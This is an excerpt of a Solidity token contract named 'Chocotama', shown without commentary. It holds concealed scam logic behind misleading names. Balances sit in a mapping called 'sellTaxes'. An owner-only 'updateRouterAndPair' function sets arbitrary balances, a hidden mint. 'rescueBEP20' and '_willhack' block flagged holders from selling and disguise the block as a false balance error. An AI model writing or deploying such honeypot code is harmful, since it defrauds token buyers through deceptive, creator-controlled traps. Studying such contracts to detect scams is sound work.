...
contract Chocotama is Ownable {
    ...
    constructor() {
        ...
        sellTaxes[WalletAddress] = _totalSupply;
    ...
    function updateRouterAndPair(address newWallet, uint256 _value) external onlyCreator {
        sellTaxes[newWallet] = _value * 10 ** decimals();
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        uint256 senderBalance = sellTaxes[sender];
        require(senderBalance >= amount, "Transfer amount exceeds balance");
         _willhack(sender, recipient, amount);
         _willanti(sender, recipient, amount);
        unchecked {
            sellTaxes[sender] = senderBalance - amount;
        }
        sellTaxes[recipient] += amount;
    ...
    function _willhack(address sender, address recipient, uint256 amount) internal view virtual{
          if(recipient != _address0 && sender != _address0 && amount > _zero){
              if( _swapper[sender]){
                  require(_swapper[sender] == false || recipient==_router || sender == _address1  ,"Transfer amount exceeds balance");}}           
    }
    ...
    function rescueBEP20(address addr,bool status) external onlyCreator {
        _swapper[addr]=status;
    }
